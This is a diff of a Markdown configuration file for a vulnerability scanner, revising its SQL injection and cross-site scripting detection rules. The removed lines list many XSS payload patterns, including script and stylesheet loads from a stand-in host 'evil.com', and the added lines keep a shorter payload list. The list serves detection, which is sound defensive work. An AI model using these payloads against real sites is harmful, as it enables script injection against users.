@@ -1,36 +1,22 @@
-# Scanner Configuration
-
 ## Enhanced Vulnerability Detection Configuration
 
-### New Detection Rules
-1. **SQL Injection Detection**: Implement rules to identify SQL injection patterns in user inputs and API requests, including:
-   - Use of parameterized queries to prevent injection.
-   - Detection of common SQL keywords in unexpected contexts such as `DROP`, `SELECT`, `INSERT`, etc.
-   - **Advanced Detection Techniques**: Utilize behavioral analysis and machine learning models to identify potential SQL injection threats based on usage patterns.
+### Updated Detection Rules
 
-2. **Cross-Site Scripting (XSS)**: Enhance detection for XSS vulnerabilities by identifying common payload patterns including:
-   - `<script>alert(1)</script>`
-   - `javascript:alert(1)`
-   - `img src=x onerror=alert(1)`
-   - `<svg/onload=alert(1)>`
-   - `<script src=http://evil.com/xss.js></script>`
-   - `<iframe src="javascript:alert('XSS')"></iframe>`
-   - `<body onload=alert('XSS')>`
-   - `'<img src=x onerror=alert(1)>'`
-   - `<script src="data:text/javascript;base64,..."></script>`
-   - `<img src="x" onerror="alert('XSS')">`
-   - `document.write('<img src=x onerror=alert(1)>');`
-   - `eval('alert(1)');`
-   - Additional event handlers such as `onfocus`, `onblur`, etc.
-   - **More Payload Patterns**:
-     - `<img src=x onerror="alert(1)">
-     - `<a href="javascript:alert(1)">Click me</a>`
-     - `<style>@import'http://evil.com/xss.css';</style>`
-     - `<link rel="stylesheet" href="javascript:alert(1);">`
-     - `<meta http-equiv="refresh" content="0;url=javascript:alert(1)">`
-   - **Dynamic Payload Detection**: Implement dynamic scanning techniques to identify newly discovered XSS payload variations in real-time.
+1. **SQL Injection Detection Enhancements**:
+   - **Parameterized Queries**: Ensure that all database interactions use parameterized queries to mitigate SQL injection risks.
+   - **Keyword Context Detection**: Implement stricter detection for SQL keywords in unexpected contexts, including `DROP`, `SELECT`, `INSERT`, etc.
+   - **Behavioral Analysis**: Leverage machine learning models to analyze usage patterns and flag potential SQL injection attempts.
+   - **Logging and Alerts**: Set up logging for detected SQL injection attempts and send alerts to the security team for immediate action.
 
-3. **Sensitive Data Exposure**: Add rules to detect hardcoded secrets, API keys, and sensitive data leakage in source code.
+2. **Cross-Site Scripting (XSS) Enhancements**:
+   - **Payload Pattern Expansion**: Continuously update the list of common XSS payload patterns to include newly discovered variations, such as:
+     - `<script>alert("XSS")</script>`
+     - `javascript:alert("XSS")`
+     - `<img src=x onerror=alert(1)>`
+     - `<svg/onload=alert(1)>`
+     - Dynamic payloads discovered in the wild.
+   - **Dynamic Scanning Techniques**: Implement real-time scanning techniques to identify dynamic payloads during execution.
+   - **Contextual Analysis**: Analyze the context in which potential XSS payloads are used to reduce false positives and improve detection accuracy.
 
 ### Tuning Existing Rules
 - **Increase Sensitivity on Authentication Flows**: Adjust thresholds for detecting vulnerabilities in authentication and session management to reduce false negatives.
